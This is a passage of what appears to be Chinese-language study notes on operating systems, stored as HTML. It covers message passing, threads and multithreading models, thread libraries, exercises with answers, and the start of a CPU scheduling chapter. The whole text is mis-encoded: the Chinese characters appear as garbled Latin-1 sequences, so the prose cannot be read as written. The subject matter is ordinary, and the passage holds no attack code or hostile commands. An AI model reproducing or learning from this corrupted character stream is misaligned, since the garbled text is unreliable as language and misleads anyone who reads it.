å¤åˆ¶å‘é€å’Œå¼•ç”¨å‘é€</p><p>Dï¼Œå›ºå®šå¤§å°å’Œå¯å˜å¤§å°æ¶ˆæ¯</p><blockquote><p>aã€ å¯¹ç§°å’Œéå¯¹ç§°é€šä¿¡â€”â€”å¯¹ç§°é€šä¿¡çš„ä¸€ä¸ªå¥½å¤„æ˜¯å®ƒå…è®¸å‘é€è€…å’Œæ¥æ”¶è€…ä¹‹é—´ä¼šåˆã€‚é˜»å¡å‘é€çš„ä¸€ä¸ªç¼ºç‚¹æ˜¯å¯èƒ½ä¸éœ€è¦é›†åˆï¼Œå¹¶ä¸”æ¶ˆæ¯å¯ä»¥å¼‚æ­¥ä¼ é€’ï¼›åœ¨å‘é€æ–¹ä¸æ„Ÿå…´è¶£çš„ç‚¹æ¥æ”¶ã€‚å› æ­¤ï¼Œæ¶ˆæ¯ä¼ é€’ç³»ç»Ÿé€šå¸¸æä¾›ä¸¤ç§å½¢å¼çš„åŒæ­¥<br>bã€ è‡ªåŠ¨å’Œæ˜¾å¼ç¼“å†²è‡ªåŠ¨ç¼“å†²æä¾›äº†ä¸€ä¸ªæ— é™é•¿çš„é˜Ÿåˆ—ï¼šå› æ­¤ç¡®ä¿å‘é€æ–¹åœ¨ç­‰å¾…å¤åˆ¶æ¶ˆæ¯æ—¶ä¸å¿…é˜»å¡ã€‚æ²¡æœ‰å…³äºå¦‚ä½•æä¾›è‡ªåŠ¨ç¼“å†²çš„è§„èŒƒï¼šä¸€ç§æ–¹æ¡ˆå¯èƒ½ä¼šåœ¨æµªè´¹å¤§é‡å†…å­˜çš„åœ°æ–¹ä¿ç•™è¶³å¤Ÿå¤§çš„å†…å­˜ã€‚æ˜¾å¼ç¼“å†²æŒ‡å®šç¼“å†²åŒºçš„å¤§å°ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå‘é€æ–¹åœ¨ç­‰å¾…é˜Ÿåˆ—ä¸­çš„å¯ç”¨ç©ºé—´æ—¶å¯èƒ½ä¼šè¢«é˜»æ­¢ã€‚ä½†æ˜¯ï¼Œæ˜¾å¼ç¼“å†²ä¸å¤ªå¯èƒ½æµªè´¹å†…å­˜<br>cã€ æŒ‰å‰¯æœ¬å‘é€å’ŒæŒ‰å¼•ç”¨å‘é€æŒ‰å‰¯æœ¬å‘é€ä¸å…è®¸æ¥æ”¶æ–¹æ›´æ”¹å‚æ•°çš„çŠ¶æ€ï¼›â€œé€šè¿‡å¼•ç”¨å‘é€â€ä¸å…è®¸è¿™æ ·åšã€‚é€šè¿‡å¼•ç”¨senidçš„ä¸€ä¸ªå¥½å¤„æ˜¯ï¼Œå®ƒå…è®¸ç¨‹åºå‘˜ç¼–å†™é›†ä¸­å¼åº”ç”¨ç¨‹åºçš„åˆ†å¸ƒå¼ç‰ˆæœ¬ã€‚javasrmiæä¾›äº†è¿™ä¸¤ç§æ–¹æ³•ï¼Œä½†æ˜¯é€šè¿‡å¼•ç”¨ä¼ é€’å‚æ•°ä¹Ÿéœ€è¦å°†å‚æ•°å£°æ˜ä¸ºè¿œç¨‹å¯¹è±¡ã€‚</p></blockquote><h1 id="ç¬¬4ç« -çº¿ç¨‹"><a class="markdownIt-Anchor" href="#ç¬¬4ç« -çº¿ç¨‹"></a> ç¬¬4ç«  çº¿ç¨‹</h1><h2 id="41-æ¦‚è¿°"><a class="markdownIt-Anchor" href="#41-æ¦‚è¿°"></a> 4.1 æ¦‚è¿°</h2><p>çº¿ç¨‹æ˜¯CPUä½¿ç”¨çš„åŸºæœ¬å•å…ƒï¼Œ å®ƒç”±<strong>çº¿ç¨‹IDã€ç¨‹åºè®¡æ•°å™¨ã€å¯„å­˜å™¨é›†åˆå’Œæ ˆ</strong>ç»„æˆã€‚å®ƒä¸å±äºåŒä¸€è¿›ç¨‹çš„å…¶ä»–çº¿ç¨‹<strong>å…±äº«ä»£ç æ®µã€æ•°æ®æ®µå’Œå…¶ä»–æ“ä½œç³»ç»Ÿèµ„æº</strong>ï¼Œå¦‚æ‰“å¼€æ–‡ä»¶å’Œä¿¡å·ã€‚</p><p>çº¿ç¨‹æ˜¯CPUä½¿ç”¨çš„åŸºæœ¬å•ä½ã€‚</p><p>ä¸€ä¸ªä¼ ç»Ÿé‡é‡çº§ï¼ˆ heavyweight ï¼‰çš„è¿›ç¨‹åªæœ‰å•ä¸ªæ§åˆ¶çº¿ç¨‹ã€‚å¦‚æœè¿›ç¨‹æœ‰å¤šä¸ªæ§åˆ¶çº¿ç¨‹ï¼Œ é‚£ä¹ˆå®ƒèƒ½åŒæ—¶åšå¤šä¸ªä»»åŠ¡ã€‚å›¾4.1 è¯´æ˜äº†ä¼ ç»Ÿå•çº¿ç¨‹è¿›ç¨‹å’Œå¤šçº¿ç¨‹è¿›ç¨‹çš„å·®åˆ«ã€‚</p><p><img src="/posts/8ce3e425/image-20211114231912641.png" alt="image-20211114231912641"></p><p><img src="/posts/8ce3e425/image-20220109131221489.png" alt="image-20220109131221489"></p><h3 id="411-åŠ¨æœº"><a class="markdownIt-Anchor" href="#411-åŠ¨æœº"></a> 4.1.1 åŠ¨æœº</h3><h3 id="412-ä¼˜ç‚¹"><a class="markdownIt-Anchor" href="#412-ä¼˜ç‚¹"></a> 4.1.2 ä¼˜ç‚¹</h3><p>å¤šçº¿ç¨‹ç¼–ç¨‹å…·æœ‰å¦‚ä¸‹4ä¸ªä¼˜ç‚¹ï¼š</p><p>â‘ <strong>å“åº”åº¦é«˜ï¼š</strong> å¦‚æœå¯¹ä¸€ä¸ªäº¤äº’ç¨‹åºé‡‡ç”¨å¤šçº¿ç¨‹ï¼Œ é‚£ä¹ˆå³ä½¿å…¶éƒ¨åˆ†é˜»å¡æˆ–æ‰§è¡Œè¾ƒå†—é•¿çš„æ“ä½œï¼Œè¯¥ç¨‹åºä»èƒ½ç»§ç»­æ‰§è¡Œï¼Œä»è€Œå¢åŠ äº†å¯¹ç”¨æˆ·çš„å“åº”ç¨‹åº¦ã€‚ä¾‹å¦‚ï¼Œå¤šçº¿ç¨‹Webæµè§ˆå™¨åœ¨ç”¨ä¸€ä¸ªçº¿ç¨‹è£…å…¥å›¾åƒæ—¶ï¼Œèƒ½é€šè¿‡å¦ä¸€ä¸ªçº¿ç¨‹ä¸ç”¨æˆ·äº¤äº’ã€‚</p><p>â‘¡<strong>èµ„æºå…±äº«ï¼š</strong> çº¿ç¨‹é»˜è®¤å…±äº«å®ƒä»¬æ‰€å±è¿›ç¨‹çš„å†…å­˜å’Œèµ„æºã€‚ä»£ç å’Œæ•°æ®å…±äº«çš„ä¼˜ç‚¹æ˜¯å®ƒèƒ½å…è®¸ä¸€ä¸ªåº”ç”¨ç¨‹åºåœ¨åŒä¸€åœ°å€ç©ºé—´æœ‰å¤šä¸ªä¸åŒçš„æ´»åŠ¨çº¿ç¨‹ã€‚</p><p>â‘¢<strong>ç»æµï¼š</strong> è¿›ç¨‹åˆ›å»ºæ‰€éœ€è¦çš„å†…å­˜å’Œèµ„æºçš„åˆ†é…æ¯”è¾ƒæ˜‚è´µã€‚ç”±äºçº¿ç¨‹èƒ½å…±äº«å®ƒä»¬æ‰€å±è¿›ç¨‹çš„èµ„æºï¼Œæ‰€ä»¥åˆ›å»ºå’Œåˆ‡æ¢çº¿ç¨‹ä¼šæ›´ä¸ºç»æµã€‚</p><p>â‘£<strong>å¤šå¤„ç†å™¨ä½“ç³»ç»“æ„çš„åˆ©ç”¨ï¼š</strong> å¤šçº¿ç¨‹çš„ä¼˜ç‚¹ä¹‹ä¸€æ˜¯èƒ½å……åˆ†ä½¿ç”¨å¤šå¤„ç†å™¨ä½“ç³»ç»“æ„ï¼Œä»¥ä¾¿æ¯ä¸ªè¿›ç¨‹èƒ½å¹¶è¡Œè¿è¡Œåœ¨ä¸åŒçš„å¤„ç†å™¨ä¸Šã€‚ä¸ç®¡æœ‰å¤šå°‘CPUï¼Œ å•çº¿ç¨‹è¿›ç¨‹åªèƒ½è¿è¡Œåœ¨ä¸€ä¸ªCPUä¸Šã€‚åœ¨å¤šCPUä¸Šä½¿ç”¨å¤šçº¿ç¨‹åŠ å¼ºäº†å¹¶å‘åŠŸèƒ½ã€‚</p><h3 id="413-çº¿ç¨‹ä¸è¿›ç¨‹çš„æ¯”è¾ƒ"><a class="markdownIt-Anchor" href="#413-çº¿ç¨‹ä¸è¿›ç¨‹çš„æ¯”è¾ƒ"></a> 4.1.3 çº¿ç¨‹ä¸è¿›ç¨‹çš„æ¯”è¾ƒ</h3><ol><li>è°ƒåº¦<ul><li>åŒä¸€è¿›ç¨‹çš„å¤šçº¿ç¨‹é—´è°ƒåº¦æ—¶ï¼Œä¸å¼•èµ·è¿›ç¨‹çš„åˆ‡æ¢</li><li>ä¸åŒè¿›ç¨‹çš„çº¿ç¨‹é—´è°ƒåº¦ï¼Œéœ€è¦è¿›ç¨‹åˆ‡æ¢<ul><li>çº¿ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢å’Œè¿›ç¨‹ä¸Šä¸‹é—®åˆ‡æ¢ä¸€ä¸ª<strong>æœ€ä¸»è¦çš„åŒºåˆ«</strong>æ˜¯çº¿ç¨‹çš„åˆ‡æ¢è™šæ‹Ÿå†…å­˜ç©ºé—´ä¾ç„¶æ˜¯ç›¸åŒçš„ï¼Œä½†æ˜¯è¿›ç¨‹åˆ‡æ¢æ˜¯ä¸åŒçš„ã€‚å› æ­¤ï¼Œè¿›ç¨‹åˆ‡æ¢éœ€è¦åˆ‡æ¢é¡µç›®å½•ä»¥ä½¿ç”¨æ–°çš„åœ°å€ç©ºé—´ã€‚è€Œçº¿ç¨‹åˆ‡æ¢ä¸éœ€è¦ï¼Œ</li></ul></li></ul></li><li>å¹¶å‘æ€§<br>ä¸€ä¸ªè¿›ç¨‹çš„å¤šä¸ªçº¿ç¨‹ä¹‹é—´å¯å¹¶å‘æ‰§è¡Œ</li><li>èµ„æºçš„æ‹¥æœ‰<br>çº¿ç¨‹ä¸æ‹¥æœ‰ç³»ç»Ÿèµ„æºï¼Œä¸æ‹¥æœ‰ä»£ç æ®µã€æ•°æ®æ®µã€‚</li></ol><h3 id="414-çº¿ç¨‹çŠ¶æ€å›¾"><a class="markdownIt-Anchor" href="#414-çº¿ç¨‹çŠ¶æ€å›¾"></a> 4.1.4 çº¿ç¨‹çŠ¶æ€å›¾</h3><p><img src="/posts/8ce3e425/image-20220109131828395.png" alt="image-20220109131828395"></p><h2 id="42-å¤šçº¿ç¨‹æ¨¡å‹"><a class="markdownIt-Anchor" href="#42-å¤šçº¿ç¨‹æ¨¡å‹"></a> 4.2 å¤šçº¿ç¨‹æ¨¡å‹</h2><p>æœ‰ä¸¤ç§ä¸åŒæ–¹æ³•æ¥æä¾›çº¿ç¨‹æ”¯æŒï¼š ç”¨æˆ·å±‚çš„<strong>ç”¨æˆ·çº¿ç¨‹</strong>æˆ–å†…æ ¸å±‚çš„<strong>å†…æ ¸çº¿ç¨‹</strong>ã€‚</p><p>ç”¨æˆ·çº¿ç¨‹å—å†…æ ¸æ”¯æŒï¼Œ è€Œæ— é¡»å†…æ ¸ç®¡ç†ï¼š è€Œå†…æ ¸çº¿ç¨‹ç”±æ“ä½œç³»ç»Ÿç›´æ¥æ”¯æŒå’Œç®¡ç†ã€‚</p><h3 id="421-å¤šå¯¹ä¸€æ¨¡å‹"><a class="markdownIt-Anchor" href="#421-å¤šå¯¹ä¸€æ¨¡å‹"></a> 4.2.1 å¤šå¯¹ä¸€æ¨¡å‹</h3><p>å¤šå¯¹ä¸€æ¨¡å‹ï¼ˆè§å›¾4.2 ï¼‰å°†è®¸å¤šç”¨æˆ·çº§çº¿ç¨‹æ˜ å°„åˆ°ä¸€ä¸ªå†…æ ¸çº¿ç¨‹ã€‚</p><p><strong>ä¼˜ç‚¹</strong>ï¼š</p><ul><li>çº¿ç¨‹ç®¡ç†æ˜¯ç”±çº¿ç¨‹åº“åœ¨ç”¨æˆ·ç©ºé—´è¿›è¡Œçš„ï¼Œ å› è€Œæ•ˆç‡æ¯”è¾ƒé«˜ã€‚</li></ul><p><strong>ç¼ºç‚¹</strong>ï¼š</p><ul><li><p>ä½†æ˜¯å¦‚æœä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œäº†é˜»å¡ç³»ç»Ÿè°ƒç”¨ï¼Œé‚£ä¹ˆæ•´ä¸ªè¿›ç¨‹ä¼šé˜»å¡ã€‚</p></li><li><p>è€Œä¸”ï¼Œ å› ä¸ºä»»ä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½è®¿é—®å†…æ ¸ï¼Œ å¤šä¸ªçº¿ç¨‹ä¸èƒ½å¹¶è¡Œè¿è¡Œåœ¨å¤šå¤„ç†å™¨ä¸Šã€‚</p></li></ul><p><img src="/posts/8ce3e425/image-20211114232532605.png" alt="image-20211114232532605"></p><h3 id="422-ä¸€å¯¹ä¸€æ¨¡å‹"><a class="markdownIt-Anchor" href="#422-ä¸€å¯¹ä¸€æ¨¡å‹"></a> 4.2.2 ä¸€å¯¹ä¸€æ¨¡å‹</h3><p>ä¸€å¯¹ä¸€æ¨¡å‹ï¼ˆè§å›¾4.3ï¼‰ å°†æ¯ä¸ªç”¨æˆ·çº¿ç¨‹æ˜ å°„åˆ°ä¸€ä¸ªå†…æ ¸çº¿ç¨‹ã€‚</p><p><strong>ä¼˜ç‚¹</strong>ï¼š</p><ul><li>è¯¥æ¨¡å‹åœ¨ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œé˜»å¡ç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œ èƒ½å…è®¸å¦ä¸€ä¸ªçº¿ç¨‹ç»§ç»­æ‰§è¡Œï¼Œ æ‰€ä»¥å®ƒæä¾›äº†æ¯”å¤šå¯¹ä¸€æ¨¡å‹æ›´å¥½çš„å¹¶å‘åŠŸèƒ½ï¼›</li><li>å®ƒä¹Ÿå…è®¸å¤šä¸ªçº¿ç¨‹èƒ½å¹¶è¡Œåœ°è¿è¡Œåœ¨å¤šå¤„ç†å™¨ç³»ç»Ÿä¸Šã€‚</li></ul><p>è¿™ç§æ¨¡å‹çš„å”¯ä¸€<strong>ç¼ºç‚¹</strong>æ˜¯ï¼š</p><ul><li>æ¯åˆ›å»ºä¸€ä¸ªç”¨æˆ·çº¿ç¨‹å°±éœ€è¦åˆ›å»ºä¸€ä¸ªç›¸åº”çš„å†…æ ¸çº¿ç¨‹ã€‚ç”±äºåˆ›å»ºå†…æ ¸çº¿ç¨‹çš„å¼€é”€ä¼šå½±å“åº”ç”¨ç¨‹åºçš„æ€§èƒ½ï¼Œ æ‰€ä»¥è¿™ç§æ¨¡å‹çš„ç»å¤§å¤šæ•°å®ç°é™åˆ¶äº†ç³»ç»Ÿæ‰€æ”¯æŒçš„çº¿ç¨‹æ•°</li></ul><p><img src="/posts/8ce3e425/image-20211114232838467.png" alt="image-20211114232838467"></p><h3 id="423-å¤šå¯¹å¤šæ¨¡å‹"><a class="markdownIt-Anchor" href="#423-å¤šå¯¹å¤šæ¨¡å‹"></a> 4.2.3 å¤šå¯¹å¤šæ¨¡å‹</h3><p>å¤šå¯¹å¤šæ¨¡å‹ï¼ˆè§å›¾4.4ï¼‰ å¤šè·¯å¤ç”¨äº†è®¸å¤šç”¨æˆ·çº¿ç¨‹åˆ°åŒæ ·æ•°é‡æˆ–æ›´å°æ•°é‡çš„å†…æ ¸çº¿ç¨‹ä¸Šã€‚å†…æ ¸çº¿ç¨‹çš„æ•°é‡å¯èƒ½ä¸ç‰¹å®šåº”ç”¨ç¨‹åºæˆ–ç‰¹å®šæœºå™¨æœ‰å…³ï¼ˆä½äºå¤šå¤„ç†å™¨ä¸Šçš„åº”ç”¨ç¨‹åºå¯æ¯”å•å¤„ç†å™¨ä¸Šåˆ†é…æ›´å¤šæ•°é‡çš„å†…æ ¸çº¿ç¨‹ï¼‰ã€‚</p><p>è™½ç„¶å¤šå¯¹ä¸€æ¨¡å‹å…è®¸å¼€å‘äººå‘˜åˆ›å»ºä»»æ„å¤šçš„ç”¨æˆ·çº¿ç¨‹ï¼Œ ä½†æ˜¯å› ä¸ºå†…æ ¸åªèƒ½ä¸€æ¬¡è°ƒåº¦ä¸€ä¸ªçº¿ç¨‹ï¼Œ æ‰€ä»¥å¹¶æ²¡æœ‰å¢åŠ å¹¶å‘æ€§ã€‚ä¸€å¯¹ä¸€æ¨¡å‹æä¾›äº†æ›´å¤§çš„å¹¶å‘æ€§ï¼Œ ä½†æ˜¯å¼€å‘äººå‘˜å¿…é¡»å°å¿ƒï¼Œ ä¸è¦åœ¨åº”ç”¨ç¨‹åºå†…åˆ›å»ºå¤ªå¤šçš„çº¿ç¨‹ï¼ˆæœ‰æ—¶å¯èƒ½ä¼šé™åˆ¶åˆ›å»ºçº¿ç¨‹çš„æ•°é‡ï¼‰ã€‚</p><p>å¤šå¯¹å¤šæ¨¡å‹æ²¡æœ‰è¿™ä¸¤è€…çš„ç¼ºç‚¹ï¼š</p><ul><li><p>å¼€å‘äººå‘˜å¯åˆ›å»ºä»»æ„å¤šçš„ç”¨æˆ·çº¿ç¨‹ï¼Œå¹¶ä¸”ç›¸åº”å†…æ ¸çº¿ç¨‹èƒ½åœ¨å¤šå¤„ç†å™¨ç³»ç»Ÿä¸Šå¹¶å‘æ‰§è¡Œã€‚</p></li><li><p>è€Œä¸”ï¼Œå½“ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œé˜»å¡ç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œå†…æ ¸èƒ½è°ƒåº¦å¦ä¸€ä¸ªçº¿ç¨‹æ¥æ‰§è¡Œã€‚</p></li></ul><p>ä¸€ä¸ªæµè¡Œçš„å¤šå¯¹å¤šæ¨¡å‹çš„å˜ç§ä»ç„¶å¤šè·¯å¤ç”¨äº†è®¸å¤šç”¨æˆ·çº¿ç¨‹åˆ°åŒæ ·æ•°é‡æˆ–æ›´å°æ•°é‡çš„å†…æ ¸çº¿ç¨‹ä¸Šï¼Œ ä½†ä¹Ÿå…è®¸å°†ä¸€ä¸ªç”¨æˆ·çº¿ç¨‹ç»‘å®šåˆ°æŸä¸ªå†…æ ¸çº¿ç¨‹ä¸Šã€‚è¿™ä¸ªå˜ç§æœ‰æ—¶è¢«ç§°ä¸ºäºŒçº§æ¨¡å‹ï¼ˆè§å›¾4.5ï¼‰</p><p><img src="/posts/8ce3e425/image-20211114233616173.png" alt="image-20211114233616173"></p><h2 id="43-çº¿ç¨‹åº“"><a class="markdownIt-Anchor" href="#43-çº¿ç¨‹åº“"></a> 4.3 çº¿ç¨‹åº“</h2><p>çº¿ç¨‹åº“ä¸ºç¨‹åºå‘˜æä¾›åˆ›å»ºå’Œç®¡ç†çº¿ç¨‹çš„APIã€‚</p><p>ä¸»è¦æœ‰ä¸¤ç§æ–¹æ³•æ¥å®ç°çº¿ç¨‹åº“ã€‚</p><ul><li>ç¬¬ä¸€ç§æ–¹æ³•æ˜¯åœ¨ç”¨æˆ·ç©ºé—´ä¸­æä¾›ä¸€ä¸ªæ²¡æœ‰å†…æ ¸æ”¯æŒçš„åº“ï¼Œ æ­¤åº“çš„æ‰€æœ‰ä»£ç å’Œæ•°æ®ç»“æ„éƒ½å­˜åœ¨äºç”¨æˆ·ç©ºé—´ä¸­ã€‚è°ƒç”¨åº“ä¸­çš„ä¸€ä¸ªå‡½æ•°åªæ˜¯å¯¼è‡´äº†ç”¨æˆ·ç©ºé—´ä¸­çš„ä¸€ä¸ªæœ¬åœ°å‡½æ•°è°ƒç”¨ï¼Œ è€Œä¸æ˜¯ç³»ç»Ÿè°ƒç”¨ã€‚</li><li>ç¬¬äºŒç§æ–¹æ³•æ˜¯æ‰§è¡Œä¸€ä¸ªç”±æ“ä½œç³»ç»Ÿç›´æ¥æ”¯æŒçš„å†…æ ¸çº§çš„åº“ã€‚æ­¤æ—¶ï¼Œåº“çš„ä»£ç å’Œæ•°æ®ç»“æ„å­˜åœ¨äºå†…æ ¸ç©ºé—´ä¸­ã€‚è°ƒç”¨åº“ä¸­çš„ä¸€ä¸ªAPI å‡½æ•°é€šå¸¸ä¼šå¯¼è‡´å¯¹å†…æ ¸çš„ç³»ç»Ÿè°ƒç”¨ã€‚</li></ul><h2 id="47-ä¹ é¢˜"><a class="markdownIt-Anchor" href="#47-ä¹ é¢˜"></a> 4.7 ä¹ é¢˜</h2><p><strong>4.1 ä¸¾ä¸¤ä¸ªå¤šçº¿ç¨‹ç¨‹åºè®¾è®¡çš„ä¾‹å­ï¼Œ å…¶ä¸­å¤šçº¿ç¨‹çš„æ€§èƒ½æ¯”å•çº¿ç¨‹çš„æ€§èƒ½å·®ã€‚</strong></p><p><strong>4.2 æè¿°çº¿ç¨‹åº“è¿›è¡Œç”¨æˆ·çº§çº¿ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢çš„è¿‡ç¨‹æ‰€é‡‡å–çš„æªæ–½ã€‚</strong></p><blockquote><p>ç”¨æˆ·çº¿ç¨‹ä¹‹é—´çš„ä¸Šä¸‹æ–‡åˆ‡æ¢ä¸å†…æ ¸çº¿ç¨‹ä¹‹é—´çš„åˆ‡æ¢éå¸¸ç›¸ä¼¼ï¼Œå°½ç®¡å®ƒå–å†³äºçº¿ç¨‹åº“ä»¥åŠå®ƒå¦‚ä½•å°†ç”¨æˆ·çº¿ç¨‹æ˜ å°„åˆ°å†…æ ¸çº¿ç¨‹ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œç”¨æˆ·çº¿ç¨‹ä¹‹é—´çš„ä¸Šä¸‹æ–‡åˆ‡æ¢æ¶‰åŠè·å–å…¶LWPçš„ä¸€ä¸ªç”¨æˆ·çº¿ç¨‹å¹¶ç”¨å¦ä¸€ä¸ªçº¿ç¨‹æ›¿æ¢å®ƒã€‚æ­¤æ“ä½œé€šå¸¸æ¶‰åŠä¿å­˜å’Œæ¢å¤å¯„å­˜å™¨çš„çŠ¶æ€ã€‚</p></blockquote><p><strong>4.3 åœ¨ä»€ä¹ˆç¯å¢ƒä¸­ï¼Œ é‡‡ç”¨å¤šå†…æ ¸çº¿ç¨‹çš„å¤šçº¿ç¨‹æ–¹æ³•æ¯”å•å¤„ç†å™¨ç³»ç»Ÿçš„å•çº¿ç¨‹æä¾›æ›´å¥½çš„æ€§èƒ½ï¼Ÿ</strong></p><blockquote><p>å½“ä¸€ä¸ªå†…æ ¸çº¿ç¨‹å‡ºç°é¡µé¢é”™è¯¯æ—¶ï¼Œå¯ä»¥åˆ‡æ¢å¦ä¸€ä¸ªå†…æ ¸çº¿ç¨‹ï¼Œä»¥ä¸€ç§æœ‰ç”¨çš„æ–¹å¼ä½¿ç”¨äº¤ç»‡æ—¶é—´ã€‚</p><p>å¦ä¸€æ–¹é¢ï¼Œå½“å‘ç”Ÿé¡µé¢é”™è¯¯æ—¶ï¼Œå•çº¿ç¨‹è¿›ç¨‹å°†æ— æ³•æ‰§è¡Œæœ‰ç”¨çš„å·¥ä½œã€‚å› æ­¤ï¼Œåœ¨ç¨‹åºå¯èƒ½ç»å¸¸å‡ºç°é¡µé¢é”™è¯¯æˆ–å¿…é¡»ç­‰å¾…å…¶ä»–ç³»ç»Ÿäº‹ä»¶çš„æƒ…å†µä¸‹ï¼Œå¤šçº¿ç¨‹è§£å†³æ–¹æ¡ˆç”šè‡³åœ¨å•å¤„ç†å™¨ç³»ç»Ÿä¸Šä¹Ÿä¼šè¡¨ç°å¾—æ›´å¥½</p></blockquote><p><strong>4.4 åœ¨å¤šçº¿ç¨‹è¿›ç¨‹ä¸­ï¼Œ ä¸‹åˆ—å“ªäº›ç¨‹åºçŠ¶æ€ç»„æˆè¢«å…±äº«ï¼Ÿ</strong><br><strong>a. å¯„å­˜å™¨å€¼</strong><br><strong>b. å †å†…å­˜</strong><br><strong>c. å…¨å±€å˜é‡</strong><br><strong>d. æ ˆå†…å­˜</strong></p><blockquote><p>ä¸€ä¸ªçº¿ç¨‹ç¨‹åºçš„çº¿ç¨‹å…±äº«<strong>å †å†…å­˜</strong>å’Œ<strong>å…¨å±€å˜é‡</strong>ï¼Œä½†æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰å±äºè‡ªå·±çš„ä¸€ç»„<strong>å¯„å­˜å™¨å€¼</strong>å’Œ<strong>æ ˆå†…å­˜</strong>ã€‚</p></blockquote><p><strong>4.5 ä½¿ç”¨å¤šç”¨æˆ·çº¿ç¨‹çš„å¤šçº¿ç¨‹è§£å†³æ–¹æ¡ˆï¼Œåœ¨å¤šå¤„ç†å™¨ç³»ç»Ÿä¸­å¯ä»¥æ¯”åœ¨å•å¤„ç†å™¨ç³»ç»Ÿä¸­è·å¾—æ›´å¥½çš„æ€§èƒ½å—ï¼Ÿ</strong></p><blockquote><p>ä¸€ä¸ªåŒ…æ‹¬å¤šç”¨æˆ·çº¿ç¨‹çš„å¤šçº¿ç¨‹ç³»ç»Ÿæ— æ³•åœ¨å¤šå¤„ç†ç³»ç»Ÿä¸ŠåŒæ—¶ä½¿ç”¨ä¸åŒçš„å¤„ç†å™¨ã€‚æ“ä½œç³»ç»Ÿåªèƒ½çœ‹åˆ°ä¸€ä¸ªå•ä¸€çš„è¿›ç¨‹ä¸”ä¸ä¼šè°ƒåº¦åœ¨ä¸åŒå¤„ç†å™¨çš„ä¸åŒè¿›ç¨‹çš„çº¿ç¨‹ã€‚<br>å› æ­¤ï¼Œ å¤šå¤„ç†å™¨ç³»ç»Ÿæ‰§è¡Œå¤šä¸ªç”¨æˆ·çº¿ç¨‹æ˜¯æ²¡æœ‰æ€§èƒ½ä¼˜åŠ¿çš„ã€‚</p></blockquote><p><strong>4.6 å¦‚4.5.2å°èŠ‚æ‰€ä»‹ç»ï¼ŒLinuxå¹¶ä¸åŒºåˆ†è¿›ç¨‹å’Œçº¿ç¨‹ï¼Œè€Œæ˜¯å°†ä¸¤è€…åŒæ ·å¯¹å¾…ï¼Œå°†ä¸€ä¸ªä»»åŠ¡è§†ä¸ºè¿›ç¨‹æˆ–çº¿ç¨‹ï¼Œ è¿™å–å†³äºä¼ é€’ç»™cloneï¼ˆï¼‰ç³»ç»Ÿè°ƒç”¨çš„æ ‡å¿—é›†ã€‚ç„¶è€Œï¼Œ è®¸å¤šæ“ä½œç³»ç»Ÿï¼Œ å¦‚Windows XPå’ŒSolaris,å¯¹å¾…è¿›ç¨‹å’Œçº¿ç¨‹æ˜¯ä¸ä¸€æ ·çš„ã€‚é€šå¸¸ï¼Œ è¿™ç±»ç³»ç»Ÿä½¿ç”¨æ ‡è®°ï¼Œ å…¶ä¸­è¿›ç¨‹çš„æ•°æ®ç»“æ„ä¸­åŒ…å«æŒ‡å‘å±äºè¿›ç¨‹çš„ä¸åŒçº¿ç¨‹ã€‚è¯•åœ¨å†…æ ¸ä¸­æ¯”è¾ƒè¿™ä¸¤ç§å¯¹è¿›ç¨‹å’Œçº¿ç¨‹å»ºæ¨¡çš„æ–¹æ³•ã€‚</strong></p><h1 id="ç¬¬5ç« -cpuè°ƒåº¦"><a class="markdownIt-Anchor" href="#ç¬¬5ç« -cpuè°ƒåº¦"></a> ç¬¬5ç«  CPUè°ƒåº¦</h1><h2 id="51-åŸºæœ¬æ¦‚å¿µ"><a class="markdownIt-Anchor" href="#51-åŸºæœ¬æ¦‚å¿µ"></a> 5.1 åŸºæœ¬æ¦‚å¿µ</h2><p>å¤šé“ç¨‹åºçš„ç›®æ ‡æ˜¯åœ¨ä»»ä½•æ—¶å€™éƒ½æœ‰æŸäº›è¿›ç¨‹åœ¨è¿è¡Œï¼Œä»¥ä½¿CPUä½¿ç”¨ç‡æœ€å¤§åŒ–ã€‚å¤šé“ç¨‹åºçš„æ€æƒ³è¾ƒä¸ºç®€å•ã€‚è¿›ç¨‹æ‰§è¡Œç›´åˆ°å®ƒå¿…é¡»ç­‰å¾…ï¼Œ é€šå¸¸ç­‰å¾…æŸäº›I/Oè¯·æ±‚çš„å®Œæˆã€‚</p><p>å½“ä¸€ä¸ªè¿›ç¨‹å¿…é¡»ç­‰å¾…æ—¶ï¼Œ æ“ä½œç³»ç»Ÿä¼šä»è¯¥è¿›ç¨‹æ‹¿èµ°CPU çš„ä½¿ç”¨æƒï¼ŒÂ·è€Œå°†CPUäº¤ç»™å…¶ä»–è¿›ç¨‹ï¼Œ å¦‚æ­¤ç»§ç»­ã€‚åœ¨è¯¥è¿›ç¨‹å¿…é¡»ç­‰å¾…çš„æ—¶é—´å†…ï¼Œå¦ä¸€ä¸ªè¿›ç¨‹å°±å¯ä»¥æ‹¿èµ°CPUçš„ä½¿ç”¨æƒã€‚</p><h3 id="511-cpu-ioåŒºé—´å‘¨æœŸ"><a class="markdownIt-Anchor" href="#511-cpu-ioåŒºé—´å‘¨æœŸ"></a> 5.1.1 CPU-I/OåŒºé—´å‘¨æœŸ</h3><p>CPUçš„æˆåŠŸè°ƒåº¦ä¾èµ–äºè¿›ç¨‹çš„å¦‚ä¸‹å±æ€§ï¼šè¿›ç¨‹æ‰§è¡Œç”±CPUæ‰§è¡Œå’ŒI/Oç­‰å¾…å‘¨æœŸç»„æˆã€‚è¿›ç¨‹åœ¨è¿™ä¸¤ä¸ªçŠ¶æ€ä¹‹é—´åˆ‡æ¢ã€‚</p><h3 id="512-cpuè°ƒåº¦ç¨‹åº"><a class="markdownIt-Anchor" href="#512-cpuè°ƒåº¦ç¨‹åº"></a> 5.1.2 